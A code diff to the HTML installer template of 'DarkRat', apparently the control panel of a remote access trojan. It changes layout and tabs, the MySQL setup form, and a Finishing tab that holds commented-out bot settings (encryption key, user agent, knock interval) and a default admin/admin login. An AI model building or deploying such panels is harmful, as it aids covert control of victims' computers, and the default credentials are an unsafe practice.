@@ -6,6 +6,8 @@
 body { font-family: Arial;
     background: #27293d;
     color: white;
+  width: 1000px;
+  margin: 0 auto;
 }
 
 /* Style the tab */
@@ -48,13 +50,14 @@ body { font-family: Arial;
 </head>
 <body>
 
-<h2>DarkRat Installer V1</h2>
-<p>Computer hacking was like a chemical bond holding us all together.</p>
+<h2>DarkRat Installer </h2>
+<p>What hackers do is figure out technology and experiment with it in ways many people never imagined. They also have a strong desire to share this information with others and to explain it to people whose only qualification may be the desire to learn.</p>
+
 
 <div class="tab">
-  <button class="tablinks" id="defaultOpen" onclick="openTab(event, 'Requirements')">Requirements</button>
+  <button class="tablinks" {if $finishing}{else} id="defaultOpen"{/if} onclick="openTab(event, 'Requirements')">Requirements</button>
   <button class="tablinks" onclick="openTab(event, 'Database')">Database</button>
-  <button class="tablinks" onclick="openTab(event, 'Finishing')">Finishing</button>
+  <button class="tablinks"  {if $finishing}id="defaultOpen" onclick="openTab(event, 'Finishing')" {/if} >Finishing</button>
 </div>
 
 <div id="Requirements" class="tabcontent">
@@ -88,9 +91,8 @@ body { font-family: Arial;
     <input name="mysqlpassword">
     <hr>
     <label>MySQL Database</label>
-    <input name="databaseName">
-    <hr>
-    <i>This Script Creates a Database with a new user the <strong>Root Login will not be saved</strong></i>
+    <input name="databaseName"> (Make sure this is Existing)
+
     <hr>
     <input value="Install" type="submit">
   </form>
@@ -100,8 +102,26 @@ body { font-family: Arial;
 </div>
 
 <div id="Finishing" class="tabcontent">
-  <h3>Tokyo</h3>
-  <p>Tokyo is the capital of Japan.</p>
+
+<!--
+  <label>Encryption Key</label>
+    <input name="encryptionkey">
+  <label>User Agent</label>
+    <input name="useragent">
+  <label>Knock Time</label>
+    <input name="requestinterval">
+    <input type="submit">
+
+  -->
+  <p>
+    Login:<br>
+    admin<br>
+    admin
+  </p>
+<hr>
+  <a href="/login" style="color:white;">Login</a>
+
+
 </div>
 
 <script>
